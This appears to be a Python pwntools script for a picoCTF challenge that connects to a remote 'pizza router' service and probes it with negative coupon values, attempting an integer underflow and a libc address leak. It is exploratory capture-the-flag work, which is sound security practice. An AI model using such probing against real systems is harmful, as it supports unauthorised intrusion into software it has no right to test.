#!/usr/bin/env python3
"""Test the pizza router commands and try coupon underflow."""
from pwn import *
import sys, io, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

context.log_level = "error"

def session():
    r = remote("mysterious-sea.picoctf.net", 59623)
    r.recv(timeout=2)  # banner
    return r

def cmd(r, c, wait=0.3):
    r.sendline(c.encode() if isinstance(c, str) else c)
    time.sleep(wait)
    try:
        return r.recv(timeout=1.5).decode(errors="replace")
    except EOFError:
        return "[EOF]"

# Test 1: simple dispatch with no coupon
print("=" * 60)
print("TEST 1: Add order, get receipt, dispatch")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "receipt 0"))
print(cmd(r, "coupon 0 -1000000"))
print(cmd(r, "receipt 0"))
print(cmd(r, "dispatch 0", wait=3))
r.close()

# Test 2: try very large negative
print("\n" + "=" * 60)
print("TEST 2: Bigger underflow")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "coupon 0 -99999999"))
print(cmd(r, "receipt 0"))
print(cmd(r, "dispatch 0", wait=3))
r.close()

# Test 3: try replay to leak libc
print("\n" + "=" * 60)
print("TEST 3: Replay (libc leak)")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "coupon 0 -1000000"))
print(cmd(r, "dispatch 0", wait=3))
print(cmd(r, "replay 0"))
r.close()
